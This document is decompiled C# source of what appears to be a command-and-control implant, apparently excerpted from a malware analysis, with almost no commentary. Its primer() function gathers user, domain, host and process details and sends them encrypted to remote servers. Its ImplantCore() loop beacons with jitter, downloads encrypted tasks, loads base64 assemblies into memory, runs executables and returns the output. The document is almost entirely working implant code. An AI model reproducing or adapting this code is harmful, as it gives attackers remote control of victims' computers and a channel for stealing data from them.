**`primer()`**
```cs
private static void primer()
{
	if (DateTime.ParseExact("2025-01-01", "yyyy-MM-dd", CultureInfo.InvariantCulture) > DateTime.Now)
	{
		Program.dfs = 0;
		string text = "";
		try
		{
			text = WindowsIdentity.GetCurrent().Name;
		}
		catch
		{
			text = Environment.UserName;
		}
		if (Program.ihInteg())
		{
			text += "*";
		}
		string userDomainName = Environment.UserDomainName;
		string environmentVariable = Environment.GetEnvironmentVariable("COMPUTERNAME");
		string environmentVariable2 = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
		int id = Process.GetCurrentProcess().Id;
		string processName = Process.GetCurrentProcess().ProcessName;
		Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
		string text2 = null;
		string text3 = null;
		foreach (string text4 in Program.basearray)
		{
			string text5 = string.Format("{0};{1};{2};{3};{4};{5};1", new object[] { userDomainName, text, environmentVariable, environmentVariable2, id, processName });
			string text6 = "DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=";
			text3 = text4;
			string text7 = text3 + "/Kettie/Emmie/Anni?Theda=Merrilee?c";
			try
			{
				string text8 = Program.GetWebRequest(Program.Encryption(text6, text5, false, null)).DownloadString(text7);
				text2 = Program.Decryption(text6, text8);
				break;
			}
			catch (Exception ex)
			{
				Console.WriteLine(string.Format(" > Exception {0}", ex.Message));
			}
			Program.dfs++;
		}
		if (string.IsNullOrEmpty(text2))
		{
			throw new Exception();
		}
		Regex regex = new Regex("RANDOMURI19901(.*)10991IRUMODNAR");
		Match match = regex.Match(text2);
		string text9 = match.Groups[1].ToString();
		regex = new Regex("URLS10484390243(.*)34209348401SLRU");
		match = regex.Match(text2);
		string text10 = match.Groups[1].ToString();
		regex = new Regex("KILLDATE1665(.*)5661ETADLLIK");
		match = regex.Match(text2);
		string text11 = match.Groups[1].ToString();
		regex = new Regex("SLEEP98001(.*)10089PEELS");
		match = regex.Match(text2);
		string text12 = match.Groups[1].ToString();
		regex = new Regex("JITTER2025(.*)5202RETTIJ");
		match = regex.Match(text2);
		string text13 = match.Groups[1].ToString();
		regex = new Regex("NEWKEY8839394(.*)4939388YEKWEN");
		match = regex.Match(text2);
		string text14 = match.Groups[1].ToString();
		regex = new Regex("IMGS19459394(.*)49395491SGMI");
		match = regex.Match(text2);
		string text15 = match.Groups[1].ToString();
		Program.ImplantCore(text3, text9, text10, text11, text12, text14, text15, text13);
	}
}
```

`ImplantCore()`
```cs
private static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS, string Jitter)
{
	Program.UrlGen.Init(stringURLS, RandomURI, baseURL);
	Program.ImgGen.Init(stringIMGS);
	Program.pKey = Key;
	int num = 5;
	Regex regex = new Regex("(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.IgnoreCase | RegexOptions.Compiled);
	Match match = regex.Match(Sleep);
	if (match.Success)
	{
		num = Program.Parse_Beacon_Time(match.Groups["t"].Value, match.Groups["u"].Value);
	}
	StringWriter stringWriter = new StringWriter();
	Console.SetOut(stringWriter);
	ManualResetEvent manualResetEvent = new ManualResetEvent(false);
	StringBuilder stringBuilder = new StringBuilder();
	double num2 = 0.0;
	if (!double.TryParse(Jitter, NumberStyles.Any, CultureInfo.InvariantCulture, out num2))
	{
		num2 = 0.2;
	}
	while (!manualResetEvent.WaitOne(new Random().Next((int)((double)(num * 1000) * (1.0 - num2)), (int)((double)(num * 1000) * (1.0 + num2)))))
	{
		if (DateTime.ParseExact(KillDate, "yyyy-MM-dd", CultureInfo.InvariantCulture) < DateTime.Now)
		{
			Program.Run = false;
			manualResetEvent.Set();
		}
		else
		{
			stringBuilder.Length = 0;
			try
			{
				string text = "";
				string cmd = null;
				try
				{
					cmd = Program.GetWebRequest(null).DownloadString(Program.UrlGen.GenerateUrl());
					text = Program.Decryption(Key, cmd).Replace("\0", string.Empty);
				}
				catch
				{
					continue;
				}
				if (text.ToLower().StartsWith("multicmd"))
				{
					string text2 = text.Replace("multicmd", "");
					string[] array = text2.Split(new string[] { "!d-3dion@LD!-d" }, StringSplitOptions.RemoveEmptyEntries);
					foreach (string text3 in array)
					{
						Program.taskId = text3.Substring(0, 5);
						cmd = text3.Substring(5, text3.Length - 5);
						if (cmd.ToLower().StartsWith("exit"))
						{
							Program.Run = false;
							manualResetEvent.Set();
							break;
						}
						if (cmd.ToLower().StartsWith("loadmodule"))
						{
							string text4 = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
							Assembly assembly = Assembly.Load(Convert.FromBase64String(text4));
							Program.Exec(stringBuilder.ToString(), Program.taskId, Key, null);
						}
						else if (cmd.ToLower().StartsWith("run-dll-background") || cmd.ToLower().StartsWith("run-exe-background"))
						{
							Thread thread = new Thread(delegate()
							{
								Program.rAsm(cmd);
							});
							Program.Exec("[+] Running background task", Program.taskId, Key, null);
							thread.Start();
						}
						else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
						{
							stringBuilder.AppendLine(Program.rAsm(cmd));
						}
						else if (cmd.ToLower().StartsWith("beacon"))
						{
							Regex regex2 = new Regex("(?<=(beacon)\\s{1,})(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.IgnoreCase | RegexOptions.Compiled);
							Match match2 = regex2.Match(text3);
							if (match2.Success)
							{
								num = Program.Parse_Beacon_Time(match2.Groups["t"].Value, match2.Groups["u"].Value);
							}
							else
							{
								stringBuilder.AppendLine(string.Format("[X] Invalid time \"{0}\"", text3));
							}
							Program.Exec("Beacon set", Program.taskId, Key, null);
						}
						else
						{
							string text5 = Program.rAsm(string.Format("run-exe Core.Program Core {0}", cmd));
						}
						stringBuilder.AppendLine(stringWriter.ToString());
						StringBuilder stringBuilder2 = stringWriter.GetStringBuilder();
						stringBuilder2.Remove(0, stringBuilder2.Length);
						if (stringBuilder.Length > 2)
						{
							Program.Exec(stringBuilder.ToString(), Program.taskId, Key, null);
						}
						stringBuilder.Length = 0;
					}
				}
			}
			catch (NullReferenceException ex)
			{
			}
			catch (WebException ex2)
			{
			}
			catch (Exception ex3)
			{
				Program.Exec(string.Format("Error: {0} {1}", stringBuilder.ToString(), ex3), "Error", Key, null);
			}
			finally
			{
				stringBuilder.AppendLine(stringWriter.ToString());
				StringBuilder stringBuilder3 = stringWriter.GetStringBuilder();
				stringBuilder3.Remove(0, stringBuilder3.Length);
				if (stringBuilder.Length > 2)
				{
					Program.Exec(stringBuilder.ToString(), "99999", Key, null);
				}
				stringBuilder.Length = 0;
			}
		}
	}
}
```

**`Decryption()`**
```cs
private static string Decryption(string key, string enc)
{
	byte[] array = Convert.FromBase64String(enc);
	byte[] array2 = new byte[16];
	Array.Copy(array, array2, 16);
	string text;
	try
	{
		SymmetricAlgorithm symmetricAlgorithm = Program.CreateCam(key, Convert.ToBase64String(array2), true);
		byte[] array3 = symmetricAlgorithm.CreateDecryptor().TransformFinalBlock(array, 16, array.Length - 16);
		text = Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(array3).Trim(new char[1])));
	}
	catch
	{
		SymmetricAlgorithm symmetricAlgorithm2 = Program.CreateCam(key, Convert.ToBase64String(array2), false);
		byte[] array4 = symmetricAlgorithm2.CreateDecryptor().TransformFinalBlock(array, 16, array.Length - 16);
		text = Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(array4).Trim(new char[1])));
	}
	finally
	{
		Array.Clear(array, 0, array.Length);
		Array.Clear(array2, 0, 16);
	}
	return text;
}
```

**`Compress()`**
```cs
private static byte[] Compress(byte[] raw)
{
	byte[] array;
	using (MemoryStream memoryStream = new MemoryStream())
	{
		using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
		{
			gzipStream.Write(raw, 0, raw.Length);
		}
		array = memoryStream.ToArray();
	}
	return array;
}
```